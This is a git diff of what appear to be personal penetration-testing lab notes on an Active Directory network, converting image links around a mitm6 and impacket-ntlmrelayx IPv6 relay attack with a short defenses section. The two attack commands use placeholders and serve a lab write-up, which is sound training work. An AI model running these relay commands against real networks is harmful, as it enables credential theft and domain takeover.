@@ -56,23 +56,23 @@ DC IP: 10.0.2.15
 
 THEPUNISHER IP (target1): 10.0.2.16
 
-![[Pasted image 20261103103501.png]]
+![Pasted image 20261103103501](../../img/Pasted%20image%2020261103103501.png)
 
-![[Pasted image 20261103103509.png]]
+![Pasted image 20261103103509](../../img/Pasted%20image%2020261103103509.png)
 
 ```bash
 sudo python mitm6 -d <DOMAIN>
 ```
 
-![[Pasted image 20261103103531.png]]
+![Pasted image 20261103103531](../../img/Pasted%20image%2020261103103531.png)
 
 ```bash
 impacket-ntlmrelayx -6 -t ldaps://<LDAP_SERVER_IP> -wh fakewpad.<DOMAIN> -l loot
 ```
 
-![[Pasted image 20261103103616.png]]
+![Pasted image 20261103103616](../../img/Pasted%20image%2020261103103616.png)
 
-![[Pasted image 20261103103623.png]]
+![Pasted image 20261103103623](../../img/Pasted%20image%2020261103103623.png)
 ## Defenses
 
 - If IPv6 is not needed in environment block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects.
